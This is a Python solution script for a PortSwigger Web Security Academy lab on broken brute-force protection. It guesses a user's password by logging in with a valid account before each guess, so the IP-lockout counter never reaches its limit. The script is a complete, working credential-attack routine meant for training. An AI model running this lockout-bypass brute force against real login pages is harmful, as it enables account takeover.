# Lab 06 — Broken brute-force protection, IP block
# PortSwigger: https://portswigger.net/web-security/authentication/password-based/lab-broken-buteforce-protection-ip-block
#
# Vulnerability: IP block resets after ONE successful login — interleaving valid
#                logins between password attempts keeps the counter from reaching
#                the lockout threshold
# Aim:           Brute-force carlos's password by interleaving wiener:peter logins
#
# Technique:
#   Build two parallel wordlists:
#     usernames: wiener, carlos, wiener, carlos, ...
#     passwords: peter,  cand1,  peter,  cand2, ...
#   Run them in lockstep (Pitchfork style) with 1 request at a time.
#   Each "wiener:peter" resets the counter; each "carlos:candidate" uses
#   one of the three allowed attempts.
#
# Usage: python authentication_lab06.py <url> <passwords_file>

import sys
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, get_csrf_from_response,
                                   load_wordlist, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def interleaved_brute_force(session, url, passwords):
    print(f"  ➜  Interleaved brute-force: wiener/carlos alternating, {len(passwords)} candidates\n")

    for i, password in enumerate(passwords, 1):
        # First: reset the counter with a valid wiener login
        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        reset_data = {"username": "wiener", "password": "peter"}
        if csrf:
            reset_data["csrf"] = csrf
        session.post(f"{url}/login", data=reset_data, allow_redirects=True)

        # Then: try the candidate password for carlos
        page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(page.text)
        data = {"username": "carlos", "password": password}
        if csrf:
            data["csrf"] = csrf
        r = session.post(f"{url}/login", data=data, allow_redirects=False)

        if r.status_code == 302:
            print(f"  ✔  Password found: {password!r}")
            return password

        if i % 20 == 0:
            print(f"  ·  {i}/{len(passwords)} tried...")

    return None


if __name__ == "__main__":
    banner()
    section("LAB 06 — BROKEN BRUTE-FORCE PROTECTION (IP BLOCK + INTERLEAVE BYPASS)")

    if len(sys.argv) != 3:
        print("  Usage: python authentication_lab06.py <url> <passwords_file>")
        sys.exit(1)

    url, pfile = sys.argv[1], sys.argv[2]
    session = make_session(proxies)
    passwords = load_wordlist(pfile)
    if not passwords:
        sys.exit(1)

    print("\n  ℹ  Strategy: log in as wiener before EVERY carlos attempt.")
    print("     This resets the failed-attempt counter before it reaches lockout.\n")

    valid_pass = interleaved_brute_force(session, url, passwords)
    if not valid_pass:
        print("  ✘  No valid password found in wordlist")
        sys.exit(1)

    print_box("CREDENTIALS FOUND", f"Username: carlos\nPassword: {valid_pass}")
